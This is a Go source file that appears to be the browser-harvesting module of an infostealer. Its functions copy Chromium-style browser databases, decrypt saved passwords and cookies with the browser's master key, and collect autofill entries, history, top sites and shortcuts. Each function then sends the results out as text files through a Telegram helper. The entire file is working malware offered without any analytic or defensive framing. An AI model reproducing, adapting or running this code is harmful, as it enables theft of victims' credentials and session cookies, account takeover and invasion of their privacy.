package scripts

import (
	"database/sql"
	"fmt"
	_ "github.com/mattn/go-sqlite3"
	"io/ioutil"
	"log"
	"strings"
)

func GetLoginPass() {

	var (
		text     string
		urls     string
		username string
		password string
	)

	tempPath := GetTempPath()

	for _, i := range GetBrowsersPath() {
		webData := fmt.Sprintf("%s\\Login Data", i)

		bytesRead, err := ioutil.ReadFile(webData)

		if err != nil {
		}

		err = ioutil.WriteFile(fmt.Sprintf("%s\\Login Data", tempPath), bytesRead, 0644)

		if err != nil {
		}

		db, err := sql.Open("sqlite3", fmt.Sprintf("%s\\Login Data", tempPath))
		if err != nil {
			log.Println(err)
		}

		rows, _ := db.Query("select origin_url, username_value, password_value  from logins")

		defer rows.Close()

		splitDefault := strings.Split(i, "\\Default")
		bPath := fmt.Sprintf(splitDefault[0] + "\\Local State")

		masterKey, err := GetMasterKey(fmt.Sprint(bPath))
		if err != nil {
			fmt.Println(err)
			continue
		}

		for rows.Next() {

			err = rows.Scan(&urls, &username, &password)
			if err != nil {

			}

			if strings.HasPrefix(password, "v10") || strings.HasPrefix(password, "v11") {

				password = strings.Trim(password, "v10")
				password = strings.Trim(password, "v11")

				pswd := DecryptBrowserValue(password, masterKey)

				if username == "" {

					continue

				} else if pswd == "" {

					text += fmt.Sprintf("URL: %s\nUSERNAME: %s\n\n", urls, username)

				} else {

					text += fmt.Sprintf("URL: %s\nUSERNAME: %s\nPASSWORD: %s\n\n", urls, username, pswd)

				}

			}

		}

	}

	SendTelegramBrowsersDocuments("logins.txt", text)

}

func GetAutoFillData() {

	var (
		text  string
		name  string
		value string
	)

	tempPath := GetTempPath()

	for _, i := range GetBrowsersPath() {
		webData := fmt.Sprintf("%s\\Web Data", i)

		bytesRead, err := ioutil.ReadFile(webData)

		if err != nil {
		}

		err = ioutil.WriteFile(fmt.Sprintf("%s\\Web Data", tempPath), bytesRead, 0644)

		if err != nil {
		}

		db, err := sql.Open("sqlite3", fmt.Sprintf("%s\\Web Data", tempPath))
		if err != nil {
			log.Println(err)
		}

		rows, err := db.Query("select  name, value from autofill")
		if err != nil {
			log.Fatal(err)
		}

		defer rows.Close()

		for rows.Next() {

			err = rows.Scan(&name, &value)
			if err != nil {
				fmt.Println(err)
			}

			text += fmt.Sprintf("NAME: %s\nVALUE: %s\n\n", name, value)
		}
	}

	SendTelegramBrowsersDocuments("autofill.txt", text)

}

func GetTopWebsite() {

	var (
		text    string
		url     string
		urlRank string
		title   string
	)

	tempPath := GetTempPath()

	for _, i := range GetBrowsersPath() {
		webData := fmt.Sprintf("%s\\Top Sites", i)

		bytesRead, err := ioutil.ReadFile(webData)

		if err != nil {
		}

		err = ioutil.WriteFile(fmt.Sprintf("%s\\Top Sites", tempPath), bytesRead, 0644)

		if err != nil {
		}

		db, err := sql.Open("sqlite3", fmt.Sprintf("%s\\Top Sites", tempPath))
		if err != nil {
			log.Println(err)
		}

		rows, _ := db.Query("select  url, url_rank, title value from top_sites")

		defer rows.Close()

		for rows.Next() {

			err = rows.Scan(&url, &urlRank, &title)
			if err != nil {
			}

			text += fmt.Sprintf("TOP: %s\nURL: %s\nTITLE: %s\n\n", urlRank, url, title)
		}
	}

	SendTelegramBrowsersDocuments("top_websites.txt", text)

}

func GetHistory() {

	var (
		text       string
		url        string
		title      string
		visitCount string
	)

	tempPath := GetTempPath()

	for _, i := range GetBrowsersPath() {
		webData := fmt.Sprintf("%s\\History", i)

		bytesRead, err := ioutil.ReadFile(webData)

		if err != nil {
		}

		err = ioutil.WriteFile(fmt.Sprintf("%s\\History", tempPath), bytesRead, 0644)

		if err != nil {
		}

		db, err := sql.Open("sqlite3", fmt.Sprintf("%s\\History", tempPath))
		if err != nil {
			log.Println(err)
		}

		rows, _ := db.Query("select  url, title, visit_count value from urls")

		defer rows.Close()

		for rows.Next() {

			err = rows.Scan(&url, &title, &visitCount)
			if err != nil {
			}

			text += fmt.Sprintf("URL: %s\nTITLE: %s\nVISIT COUNT: %s\n\n", url, title, visitCount)
		}
	}

	SendTelegramBrowsersDocuments("history.txt", text)

}

func GetShortcuts() {

	var (
		text    string
		url     string
		content string
	)

	tempPath := GetTempPath()

	for _, i := range GetBrowsersPath() {
		webData := fmt.Sprintf("%s\\Shortcuts", i)

		bytesRead, err := ioutil.ReadFile(webData)

		if err != nil {
		}

		err = ioutil.WriteFile(fmt.Sprintf("%s\\Shortcuts", tempPath), bytesRead, 0644)

		if err != nil {
		}

		db, err := sql.Open("sqlite3", fmt.Sprintf("%s\\Shortcuts", tempPath))
		if err != nil {
			log.Println(err)
		}

		rows, _ := db.Query("select  url, text value from omni_box_shortcuts")

		defer rows.Close()

		for rows.Next() {

			err = rows.Scan(&url, &content)
			if err != nil {
			}

			text += fmt.Sprintf("TEXT: %s\nURL: %s\n\n", content, url)
		}
	}

	SendTelegramBrowsersDocuments("shortcuts.txt", text)

}

func GetCookies() {

	var (
		text    string
		hostKey string
		name    string
		cookies string
	)

	tempPath := GetTempPath()

	for _, i := range GetBrowsersPath() {
		webData := fmt.Sprintf("%s\\Network\\Cookies", i)

		bytesRead, err := ioutil.ReadFile(webData)

		if err != nil {
		}

		err = ioutil.WriteFile(fmt.Sprintf("%s\\Cookies", tempPath), bytesRead, 0644)

		if err != nil {
		}

		db, err := sql.Open("sqlite3", fmt.Sprintf("%s\\Cookies", tempPath))
		if err != nil {
			log.Println(err)
		}

		rows, err := db.Query("select host_key, name, encrypted_value  from cookies")
		if err != nil {
			fmt.Println(err)
			continue
		}
		defer rows.Close()

		splitDefault := strings.Split(i, "\\Default")
		bPath := fmt.Sprintf(splitDefault[0] + "\\Local State")

		masterKey, err := GetMasterKey(fmt.Sprint(bPath))
		if err != nil {
			fmt.Println(err)
			continue
		}

		for rows.Next() {

			err = rows.Scan(&hostKey, &name, &cookies)
			if err != nil {
			}

			if strings.HasPrefix(cookies, "v10") || strings.HasPrefix(cookies, "v11") {

				cookies = strings.Trim(cookies, "v10")
				cookies = strings.Trim(cookies, "v11")

				cook := DecryptBrowserValue(cookies, masterKey)

				if hostKey == "" {

					text += fmt.Sprintf("NAME: %s\nVALUE: %s \n\n", name, cook)

				} else {

					text += fmt.Sprintf("HOST: %s\nNAME: %s\nVALUE: %s \n\n", hostKey, name, cook)

				}

			}
		}
	}

	SendTelegramBrowsersDocuments("cookies.txt", text)
}
